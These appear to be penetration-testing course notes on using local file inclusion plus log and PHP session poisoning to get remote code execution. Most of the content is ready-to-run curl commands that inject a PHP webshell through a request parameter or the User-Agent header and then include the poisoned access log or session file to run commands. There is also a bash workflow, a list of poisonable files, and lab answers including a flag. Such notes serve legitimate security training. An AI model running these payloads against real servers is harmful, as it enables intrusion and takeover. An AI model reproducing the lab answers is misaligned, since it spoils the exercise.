## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 8 — Log Poisoning

## Description
Achieving RCE through LFI by poisoning PHP session files or server access logs with PHP code, then including the poisoned file to execute commands.

## Tags
lfi, rce, log-poisoning, session-poisoning, apache, php

## Commands
- curl -s 'http://<TARGET>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E'
- curl -s 'http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_<SESSID>&cmd=<CMD>' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
- curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=<CMD>' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=/var/log/nginx/access.log&cmd=<CMD>' | grep -v "<.*>"

## What This Section Covers
Log poisoning abuses the fact that PHP executes any code found in files it includes. If you can write PHP code into a file the server logs (session file, access log, etc.) and that file is readable via LFI, you get RCE. Two main vectors: PHP session files (you control the `language` parameter which gets stored in your session) and Apache/Nginx access logs (you control the `User-Agent` header which gets logged on every request).

## Methodology

### Method 1 — PHP Session Poisoning
1. Find your `PHPSESSID` cookie value (browser devtools or `curl -I`).
2. Verify the session file is readable via LFI: `?language=/var/lib/php/sessions/sess_<SESSID>`
3. Confirm a parameter you control appears in the session file (e.g. `page` value mirrors `?language=`).
4. Poison it by setting `?language=` to a URL-encoded PHP webshell: `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
5. Include the session file + pass command: `?language=/var/lib/php/sessions/sess_<SESSID>&cmd=id`
6. **Re-poison before each command** — including the session file overwrites `page` with the file path.

### Method 2 — Apache/Nginx Log Poisoning
1. Confirm log is readable via LFI: `?language=/var/log/apache2/access.log`
2. Poison the `User-Agent` header with a PHP webshell (one request is enough — it stays in the log):
   `curl -s 'http://<TARGET>/index.php' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'`
3. Include the log + pass command: `?language=/var/log/apache2/access.log&cmd=id`
4. No need to re-poison — the webshell stays in the log across requests.

## Multi-step Workflow

```bash
# === SESSION POISONING ===

# Step 1 - get PHPSESSID
curl -s -I 'http://<TARGET>/index.php' | grep -i set-cookie
# Or check browser: DevTools → Application → Cookies

# Step 2 - verify session file readable + see controlled fields
curl -s 'http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_<SESSID>' | grep -v "<.*>"

# Step 3 - poison session with webshell (URL-encoded: <?php system($_GET["cmd"]); ?>)
curl -s 'http://<TARGET>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E'

# Step 4 - execute command via poisoned session
curl -s 'http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_<SESSID>&cmd=pwd' | grep -v "<.*>"
# Re-poison before each new command (step 3 → step 4)


# === LOG POISONING ===

# Step 1 - confirm log readable
curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log' | grep -v "<.*>"

# Step 2 - poison User-Agent (single request, persists in log)
curl -s 'http://<TARGET>/index.php' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Step 3 - include log + execute commands
curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=ls+/' | grep -v "<.*>"
curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=cat+/<FLAGFILE>' | grep -v "<.*>"
```

## Other Poisonable Log Files

| File | Poison Vector |
|---|---|
| `/var/log/apache2/access.log` | `User-Agent` header |
| `/var/log/nginx/access.log` | `User-Agent` header |
| `/var/lib/php/sessions/sess_<ID>` | Controlled GET parameter |
| `/var/log/sshd.log` | SSH login username |
| `/var/log/mail` | Email sender/body |
| `/var/log/vsftpd.log` | FTP login username |
| `/proc/self/environ` | `User-Agent` or other env-reflected headers |
| `/proc/self/fd/<N>` (N=0-50) | Same as above |

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Output of `pwd` | `/var/www/html` | PHP session poisoning → poison `selected_language` field → include `sess_<ID>` → `cmd=pwd` |
| Flag at `/` | `HTB{1095_5#0u1d_n3v3r_63_3xp053d}` | Apache log poisoning → `User-Agent` webshell → include `access.log` → `ls /` → `cat /c85ee5082f4c723ace6c0796e3a3db09.txt` |

## Key Takeaways
- Session poisoning requires re-poisoning before each command — including the session file clobbers the `page` value.
- Log poisoning persists — one poisoned `User-Agent` request is enough; the webshell stays in the log for all future includes.
- Apache logs need higher privileges to read; Nginx logs are readable by `www-data` by default — try Nginx first on unknown configs.
- `/proc/self/environ` is a fallback if logs aren't readable — it reflects the `User-Agent` and other request headers.
- Any log that records something you control + is readable via LFI = potential RCE vector.

## Gotchas
- Logs are large — including `access.log` on a busy server can be slow or crash it. Be efficient in production.
- The session file path on Windows is `C:\Windows\Temp\sess_<ID>` — different from Linux.
- After poisoning the session, you MUST include the session file path as the `language` value, NOT the webshell again — the webshell was already written to the file.
- Session poisoning has a race condition with curl chaining — the second request can overwrite the webshell before it executes. Use the browser (two tabs in quick succession) for more reliable timing.
- The controlled session field name varies by app — check the raw session file first (`?language=/var/lib/php/sessions/sess_<ID>`) to see what field mirrors your input.
- If `grep -v "<.*>"` strips your output, try without the grep — sometimes command output appears inside HTML attributes.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[07-lfi-and-file-uploads]] | [[09-automated-scanning]] →
<!-- AUTO-LINKS-END -->
